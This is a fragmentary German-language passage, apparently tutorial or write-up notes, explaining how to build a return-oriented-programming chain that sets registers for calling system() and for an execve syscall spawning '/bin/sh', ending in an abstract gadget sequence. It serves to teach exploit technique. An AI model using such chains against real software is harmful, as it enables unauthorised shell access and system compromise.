...
1. Über Gadgets die Registerwerte so setzen: 
    * RDI=sh_string
2. system()-Funktion aufrufen
3. Über Gadgets die Registerwerte so setzen: 
    * RDI=0x42
...
* RSI = String "r\0"
* RAX = Der zurückgegebene File Descriptor
...
Nun wird erklärt, wie die Register mithilfe der Gadgets zu setzen sind. Um RSI zu setzen, wird die ROP-Chain im Folgenden rückwärts konstruiert:
...
| Gewünschter Assembler-Code  | Gadget-/Datenfolge                                                                                     |
|-----------------------------|--------------------------------------------------------------------------------------------------------|
...
Die folgenden Gadgets können verwendet werden, um die Register zu setzen.
...
Wir benötigen vor dem SYSCALL:
* RAX = 59
* RDI = (Ptr -> "/bin/sh")
* RSI = (Ptr -> {Ptr -> "/bin/sh", NULL})
* RDX = NULL

Dies wird mit den folgenden Gadgets bewerkstelligt:
...
Somit ist die ROP-Chain wie folgt:
G3 - G6 - G1 - (ptr -> "/bin/sh") - G9 - (ptr -> {ptr -> "/bin/sh", NULL}) - G2 - 0 - G10 - 0x68732f6e69622f - (ptr -> "/bin/sh") - 0